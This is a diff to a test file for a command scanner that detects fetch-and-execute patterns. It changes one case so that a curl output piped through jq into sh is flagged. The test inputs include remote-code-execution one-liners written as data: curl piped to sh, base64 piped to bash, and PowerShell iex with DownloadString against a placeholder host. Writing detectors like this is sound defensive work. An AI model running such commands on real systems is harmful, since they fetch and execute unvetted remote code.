@@ -43,7 +43,8 @@ describe("exec patterns are linear", () => {
     expect(rules(findExecPatterns("curl -s https://x.invalid |\n  sh"))).toContain("curl-pipe-shell");
     expect(rules(findExecPatterns("base64 -d blob |\n bash"))).toContain("base64-pipe-shell");
     expect(rules(findExecPatterns("iex (New-Object Net.WebClient).DownloadString('https://x.invalid')"))).toContain("powershell-iex");
-    expect(findExecPatterns("curl -s https://x.invalid | jq . | sh")[0]).toBeUndefined();
+    // A stage between the download and the shell still runs the download (Mythos A5, 12 Nov).
+    expect(rules(findExecPatterns("curl -s https://x.invalid | jq . | sh"))).toContain("curl-pipe-shell");
     expect(findExecPatterns("curl -o out.json https://x.invalid && npm install")).toEqual([]);
   });
 
